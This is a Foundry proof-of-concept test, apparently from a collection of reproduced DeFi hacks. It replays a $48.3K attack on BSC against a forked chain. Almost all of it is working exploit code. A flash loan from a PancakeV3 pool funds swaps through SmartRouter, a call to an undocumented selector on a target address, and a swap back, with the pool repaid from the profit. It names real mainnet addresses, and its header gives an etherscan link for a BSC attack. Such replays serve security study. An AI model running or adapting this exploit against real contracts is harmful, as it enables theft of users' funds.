pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 48.3K USD
// Attacker : 0x7248939f65bdd23aab9eaab1bc4a4f909567486e
// Attack Contract : https://etherscan.io/address/0xc59d50e26aee2ca34ae11f08924c0bc619728e7c
// Vulnerable Contract : 
// Attack Tx : https://bscscan.com/tx/0x9191153c8523d97f3441a08fef1da5e4169d9c2983db9398364071daa33f59d1

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1932309011564781774
// Twitter Guy : https://x.com/TenArmorAlert/status/1932309011564781774
// Hacking God : N/A

address constant PancakeV3Pool = 0xbaf9f711a39271701b837c5cC4F470d533bACf33;
address constant SmartRouter = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;
address constant TransparentUpgradeableProxy = 0x8d0D000Ee44948FC98c9B98A4FA4921476f08B0d;
address constant Token = 0x0B9dDfCA570305128d347A263d7061E1eB774444;
address constant attacker = 0xF514C02048E9296D56d693F24dFC6780A2bdD18A;
address constant addr = 0x8490AA884Adb08a485BC8793C17296c9E2c91294;

interface IPancakeV3Pool_Local {
    function flash(address, uint256, uint256, bytes calldata) external;
}
struct ExactInputSingleParams {
    address tokenIn;
    address tokenOut;
    uint24 fee;
    address recipient;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
}
interface ISmartRouter {
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}
interface ITransparentUpgradeableProxy_Local {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}
interface IToken_Local {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 51190821);
    }
    
    function testPoC() public {
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of address(attC)", IERC20(TransparentUpgradeableProxy).balanceOf(address(attC)), 18);
    }
}

contract AttackerC {
    

    function attack() public {
        if (tx.origin == attacker) {
            IPancakeV3Pool_Local(PancakeV3Pool).flash(address(this), 0, 9350 * 1e18, hex"00");
        }
    }
  
    function pancakeV3FlashCallback(uint256 /*amount0*/, uint256 /*amount1*/, bytes calldata /*data*/) external {
        ITransparentUpgradeableProxy_Local(TransparentUpgradeableProxy).approve(SmartRouter, 100000000000000000000000 * 1e18);
        {
            ISmartRouter(SmartRouter).exactInputSingle(
                ExactInputSingleParams({
                    tokenIn: TransparentUpgradeableProxy,
                    tokenOut: Token,
                    fee: uint24(100),
                    recipient: address(this),
                    amountIn: 9350 * 1e18,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: uint160(0)
                })
            );
        }
        (bool s, ) = addr.call(abi.encodeWithSelector(bytes4(0x5ff02eae)));
        require(s, "addr call fail");
        IToken_Local(Token).approve(SmartRouter, 100000000000000000000000000 * 1e18);
        uint256 bal = IToken_Local(Token).balanceOf(address(this));
        {
            ISmartRouter(SmartRouter).exactInputSingle(
                ExactInputSingleParams({
                    tokenIn: Token,
                    tokenOut: TransparentUpgradeableProxy,
                    fee: uint24(100),
                    recipient: address(this),
                    amountIn: bal,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: uint160(0)
                })
            );
        }
        ITransparentUpgradeableProxy_Local(TransparentUpgradeableProxy).transfer(PancakeV3Pool, 9350935 * 10**15);
    }
}